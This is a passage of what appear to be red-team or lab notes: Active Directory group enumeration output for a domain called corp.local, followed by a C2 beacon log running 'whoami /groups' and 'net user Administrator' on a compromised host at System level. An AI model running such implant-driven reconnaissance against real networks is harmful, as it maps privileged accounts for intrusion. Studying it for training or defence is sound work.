dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-517}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 9dd39c31-4c06-446a-b835-8b5bedd3ebe5

name                           : Cert Publishers

distinguishedname              : CN=Cert Publishers,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Cert Publishers

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local}

cn                             : {Cert Publishers}

objectclass                    : {top, group}

usnchanged                     : 12344

description                    : Members of this group are permitted to publish certificates to the directory

instancetype                   : 4

usncreated                     : 12342

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-512}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 93761be8-dc9c-497f-b1cd-8110dd667f7a

name                           : Domain Admins

distinguishedname              : CN=Domain Admins,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 10/19/2023 5:08:06 PM

samaccountname                 : Domain Admins

member                         : {CN=coco,CN=Users,DC=corp,DC=local, CN=ned_adm,OU=Security Groups,OU=Corp,DC=corp,DC=local, CN=iamtheadministrator,OU=Operations,OU=Corp,DC=corp,DC=local, CN=Administrator,CN=Users,DC=corp,DC=local}

memberof                       : {CN=CyberOps,CN=Users,DC=corp,DC=local, CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local, CN=Administrators,CN=Builtin,DC=corp,DC=local}

cn                             : {Domain Admins}

objectclass                    : {top, group}

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

usnchanged                     : 531709

description                    : Designated administrators of the domain

instancetype                   : 4

usncreated                     : 12345

admincount                     : 1

iscriticalsystemobject         : True

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-513}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : a0d28a30-feb1-4e51-96f5-f3305f44aafb

name                           : Domain Users

distinguishedname              : CN=Domain Users,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Domain Users

memberof                       : {CN=Users,CN=Builtin,DC=corp,DC=local}

cn                             : {Domain Users}

objectclass                    : {top, group}

usnchanged                     : 12350

description                    : All domain users

instancetype                   : 4

usncreated                     : 12348

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-514}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 32479b7e-a386-49ff-a38d-f187f5a2e78e

name                           : Domain Guests

distinguishedname              : CN=Domain Guests,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Domain Guests

memberof                       : {CN=Guests,CN=Builtin,DC=corp,DC=local}

cn                             : {Domain Guests}

objectclass                    : {top, group}

usnchanged                     : 12353

description                    : All domain guests

instancetype                   : 4

usncreated                     : 12351

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-520}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 4f1b6fea-2a7d-47ec-ba65-0bec4e0aacd4

name                           : Group Policy Creator Owners

distinguishedname              : CN=Group Policy Creator Owners,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Group Policy Creator Owners

member                         : {CN=Administrator,CN=Users,DC=corp,DC=local}

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local}

cn                             : {Group Policy Creator Owners}

objectclass                    : {top, group}

usnchanged                     : 12391

description                    : Members in this group can modify group policy for the domain

instancetype                   : 4

usncreated                     : 12354

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-553}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 7d014922-eabf-474c-b427-a8205c9a3b9c

name                           : RAS and IAS Servers

distinguishedname              : CN=RAS and IAS Servers,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : RAS and IAS Servers

cn                             : {RAS and IAS Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12359

instancetype                   : 4

usncreated                     : 12357

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Servers in this group can access remote access properties of users

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-32-549}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 0b75e566-13c5-4637-a9b8-e17ca7b1c4b9

name                           : Server Operators

distinguishedname              : CN=Server Operators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 4/24/2018 5:16:10 AM

samaccountname                 : Server Operators

cn                             : {Server Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 42608

instancetype                   : 4

usncreated                     : 12360

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

admincount                     : 1

description                    : Members can administer domain servers

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-548}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : b71fa4c3-b31b-46bc-a4a5-b83a031d713b

name                           : Account Operators

distinguishedname              : CN=Account Operators,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 4/24/2018 5:16:10 AM

samaccountname                 : Account Operators

cn                             : {Account Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 42609

instancetype                   : 4

usncreated                     : 12363

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

admincount                     : 1

description                    : Members can administer domain user and group accounts

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-554}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 8f5ab621-a75d-45df-9257-b6cb7c16f43b

name                           : Pre-Windows 2000 Compatible Access

distinguishedname              : CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Pre-Windows 2000 Compatible Access

member                         : {CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=corp,DC=local}

cn                             : {Pre-Windows 2000 Compatible Access}

objectclass                    : {top, group}

usnchanged                     : 12393

description                    : A backward compatibility group which allows read access on all users and groups in the domain

instancetype                   : 4

usncreated                     : 12366

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-557}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : f6253ced-48fd-48e3-aa5b-d96cc960a1cd

name                           : Incoming Forest Trust Builders

distinguishedname              : CN=Incoming Forest Trust Builders,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Incoming Forest Trust Builders

cn                             : {Incoming Forest Trust Builders}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12371

instancetype                   : 4

usncreated                     : 12369

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group can create incoming, one-way trusts to this forest

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-560}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : a354cb42-6856-4595-b525-b5b24912b6a8

name                           : Windows Authorization Access Group

distinguishedname              : CN=Windows Authorization Access Group,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Windows Authorization Access Group

member                         : {CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=corp,DC=local}

cn                             : {Windows Authorization Access Group}

objectclass                    : {top, group}

usnchanged                     : 12396

description                    : Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects

instancetype                   : 4

usncreated                     : 12372

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-32-561}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 4ef2a2c5-4c5f-404d-aaaa-1f649e8ed831

name                           : Terminal Server License Servers

distinguishedname              : CN=Terminal Server License Servers,CN=Builtin,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Terminal Server License Servers

cn                             : {Terminal Server License Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12377

instancetype                   : 4

usncreated                     : 12375

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:12:17 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-571}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 6b1d2d41-8105-4ec6-bb41-400bcde2ada6

name                           : Allowed RODC Password Replication Group

distinguishedname              : CN=Allowed RODC Password Replication Group,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Allowed RODC Password Replication Group

cn                             : {Allowed RODC Password Replication Group}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12404

instancetype                   : 4

usncreated                     : 12402

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members in this group can have their passwords replicated to all read-only domain controllers in the domain

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-572}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : bb637552-7b64-4c6c-8f9b-0fb796d397f4

name                           : Denied RODC Password Replication Group

distinguishedname              : CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Denied RODC Password Replication Group

member                         : {CN=Read-only Domain Controllers,CN=Users,DC=corp,DC=local, CN=Group Policy Creator Owners,CN=Users,DC=corp,DC=local, CN=Domain Admins,CN=Users,DC=corp,DC=local, CN=Cert Publishers,CN=Users,DC=corp,DC=local, CN=Enterprise Admins,CN=Users,DC=corp,DC=local, CN=Schema Admins,CN=Users,DC=corp,DC=local, CN=Domain Controllers,CN=Users,DC=corp,DC=local, CN=krbtgt,CN=Users,DC=corp,DC=local}

cn                             : {Denied RODC Password Replication Group}

objectclass                    : {top, group}

usnchanged                     : 12433

description                    : Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain

instancetype                   : 4

usncreated                     : 12405

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-521}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : b1b0f071-17f7-4e00-8b37-7b2cb2ac125e

name                           : Read-only Domain Controllers

distinguishedname              : CN=Read-only Domain Controllers,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 4/24/2018 5:16:10 AM

samaccountname                 : Read-only Domain Controllers

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local}

cn                             : {Read-only Domain Controllers}

objectclass                    : {top, group}

usnchanged                     : 42614

description                    : Members of this group are Read-Only Domain Controllers in the domain

instancetype                   : 4

usncreated                     : 12419

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

admincount                     : 1

iscriticalsystemobject         : True

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:16:10 AM, 4/24/2018 4:52:44 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-498}

grouptype                      : UNIVERSAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : d3791351-d06b-4f02-a0cc-5eac662df211

name                           : Enterprise Read-only Domain Controllers

distinguishedname              : CN=Enterprise Read-only Domain Controllers,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Enterprise Read-only Domain Controllers

cn                             : {Enterprise Read-only Domain Controllers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12431

instancetype                   : 4

usncreated                     : 12429

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group are Read-Only Domain Controllers in the enterprise

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-522}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 565eae19-8ce3-4689-b38b-592ee58b1445

name                           : Cloneable Domain Controllers

distinguishedname              : CN=Cloneable Domain Controllers,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Cloneable Domain Controllers

cn                             : {Cloneable Domain Controllers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12442

instancetype                   : 4

usncreated                     : 12440

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group that are domain controllers may be cloned.

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-525}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : a46459fc-f266-49cc-8d6f-2b6b8a44e11c

name                           : Protected Users

distinguishedname              : CN=Protected Users,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Protected Users

cn                             : {Protected Users}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12447

instancetype                   : 4

usncreated                     : 12445

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-526}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : e4a0e04b-064b-451f-a4b4-1ee78b2904ca

name                           : Key Admins

distinguishedname              : CN=Key Admins,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 4/20/2022 2:59:43 PM

samaccountname                 : Key Admins

cn                             : {Key Admins}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 495744

instancetype                   : 4

usncreated                     : 12450

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

admincount                     : 1

description                    : Members of this group can perform administrative actions on key objects within the domain.

dscorepropagationdata          : {4/20/2022 2:59:43 PM, 6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 7/14/1601 10:36:48 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-527}

grouptype                      : UNIVERSAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 1f4e6ca8-72bb-4329-9dc7-eb64427888c7

name                           : Enterprise Key Admins

distinguishedname              : CN=Enterprise Key Admins,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:38:48 AM

whenchanged                    : 3/28/2018 12:38:48 AM

samaccountname                 : Enterprise Key Admins

cn                             : {Enterprise Key Admins}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12455

instancetype                   : 4

usncreated                     : 12453

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : Members of this group can perform administrative actions on key objects within the forest.

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 6:16:33 PM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-1101}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 275d5cf1-0e9b-42ae-9a97-2ee3e45824cd

name                           : DnsAdmins

distinguishedname              : CN=DnsAdmins,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:39:38 AM

whenchanged                    : 3/28/2018 12:39:38 AM

samaccountname                 : DnsAdmins

cn                             : {DnsAdmins}

objectclass                    : {top, group}

usnchanged                     : 12486

instancetype                   : 4

usncreated                     : 12484

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : DNS Administrators Group

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:04:17 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-1102}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 040c8994-8b02-4fba-9a18-995a7f4b15bd

name                           : DnsUpdateProxy

distinguishedname              : CN=DnsUpdateProxy,CN=Users,DC=corp,DC=local

whencreated                    : 3/28/2018 12:39:38 AM

whenchanged                    : 3/28/2018 12:39:38 AM

samaccountname                 : DnsUpdateProxy

cn                             : {DnsUpdateProxy}

objectclass                    : {top, group}

usnchanged                     : 12489

instancetype                   : 4

usncreated                     : 12489

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

description                    : DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:04:17 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-1115}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 148ec1e5-4d79-4321-9e94-2e29d043d78d

name                           : IT Admins

distinguishedname              : CN=IT Admins,CN=Users,DC=corp,DC=local

whencreated                    : 3/29/2018 3:06:29 AM

whenchanged                    : 3/29/2018 3:32:53 AM

samaccountname                 : IT Admins

member                         : {CN=salvador,OU=Contractors,OU=Corp,DC=corp,DC=local}

memberof                       : {CN=Service Desk,CN=Users,DC=corp,DC=local}

cn                             : {IT Admins}

objectclass                    : {top, group}

usnchanged                     : 13859

instancetype                   : 4

usncreated                     : 13813

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:04:17 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-1116}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : f9a214a1-c57f-4341-beec-51da5d245224

name                           : Lazy Admins

distinguishedname              : CN=Lazy Admins,CN=Users,DC=corp,DC=local

whencreated                    : 3/29/2018 3:07:16 AM

whenchanged                    : 3/29/2018 3:37:52 AM

samaccountname                 : Lazy Admins

member                         : {CN=lazy_admin,OU=IT,OU=Corp,DC=corp,DC=local}

cn                             : {Lazy Admins}

objectclass                    : {top, group}

usnchanged                     : 13879

instancetype                   : 4

usncreated                     : 13817

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 1/1/1601 12:04:17 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-1117}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : c7eefa67-bf7e-476c-ac9b-877811919b56

name                           : CyberOps

distinguishedname              : CN=CyberOps,CN=Users,DC=corp,DC=local

whencreated                    : 3/29/2018 3:07:45 AM

whenchanged                    : 4/24/2018 5:42:50 AM

samaccountname                 : CyberOps

member                         : {CN=cyber_adm,OU=Operations,OU=Corp,DC=corp,DC=local, CN=Domain Admins,CN=Users,DC=corp,DC=local}

cn                             : {CyberOps}

objectclass                    : {top, group}

usnchanged                     : 42641

instancetype                   : 4

usncreated                     : 13822

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 4/24/2018 5:42:50 AM, 4/24/2018 5:38:58 AM, 4/24/2018 5:36:40 AM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-1802}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : cefb6308-4c79-475f-a472-1653723ae080

name                           : Service Desk

distinguishedname              : CN=Service Desk,CN=Users,DC=corp,DC=local

whencreated                    : 4/24/2018 3:46:15 AM

whenchanged                    : 4/24/2018 3:48:19 AM

samaccountname                 : Service Desk

member                         : {CN=IT Admins,CN=Users,DC=corp,DC=local}

cn                             : {Service Desk}

objectclass                    : {top, group}

usnchanged                     : 42444

instancetype                   : 4

usncreated                     : 42435

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-1803}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : e93f3df7-8f8a-4af5-a0e7-2449dead38a2

name                           : Security Engineers

distinguishedname              : CN=Security Engineers,CN=Users,DC=corp,DC=local

whencreated                    : 4/24/2018 3:49:52 AM

whenchanged                    : 6/11/2018 3:53:08 AM

samaccountname                 : Security Engineers

member                         : {CN=lazy_admin,OU=IT,OU=Corp,DC=corp,DC=local}

cn                             : {Security Engineers}

objectclass                    : {top, group}

usnchanged                     : 147075

instancetype                   : 4

usncreated                     : 42447

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

dscorepropagationdata          : {6/11/2018 3:53:08 AM, 6/11/2018 3:48:37 AM, 6/11/2018 3:44:37 AM, 6/11/2018 3:43:56 AM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-3605}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 6bb83fa1-e5e9-4b78-93e8-2d86da8516cc

name                           : Legacy Web Servers

distinguishedname              : CN=Legacy Web Servers,CN=Users,DC=corp,DC=local

whencreated                    : 6/2/2018 3:08:38 AM

whenchanged                    : 2/10/2020 7:57:34 PM

samaccountname                 : Legacy Web Servers

member                         : {CN=WEB-WIN01,OU=Web Servers,OU=Servers,OU=Corp,DC=corp,DC=local}

cn                             : {Legacy Web Servers}

objectclass                    : {top, group}

usnchanged                     : 254266

instancetype                   : 4

usncreated                     : 135986

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-2291914956-3290296217-2402366952-3610}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : e5534b88-ba70-4f9d-b0c9-0e1da3191ddd

name                           : SOC Monitoring

distinguishedname              : CN=SOC Monitoring,CN=Users,DC=corp,DC=local

whencreated                    : 6/11/2018 3:19:00 AM

whenchanged                    : 6/11/2018 3:19:15 AM

samaccountname                 : SOC Monitoring

member                         : {CN=cyber_adm,OU=Operations,OU=Corp,DC=corp,DC=local}

cn                             : {SOC Monitoring}

objectclass                    : {top, group}

usnchanged                     : 147018

instancetype                   : 4

usncreated                     : 147014

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=corp,DC=local

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 1/1/1601 12:00:01 AM}






```
net commands
```shell
[10/19 16:37:56] beacon> shell whoami /groups
[10/19 16:37:56] [*] Tasked beacon to run: whoami /groups
[10/19 16:37:56] [+] host called home, sent: 45 bytes
[10/19 16:37:56] [+] received output:


GROUP INFORMATION

-----------------



Group Name                             Type             SID          Attributes                                        

====================================== ================ ============ ==================================================

Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   

Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group

BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group

CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group

BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    


[10/19 16:38:22] beacon> shell net user Administrator
[10/19 16:38:22] [*] Tasked beacon to run: net user Administrator
[10/19 16:38:22] [+] host called home, sent: 53 bytes
[10/19 16:38:22] [+] received output:
User name                    Administrator

Full Name                    

Comment                      Built-in account for administering the computer/domain

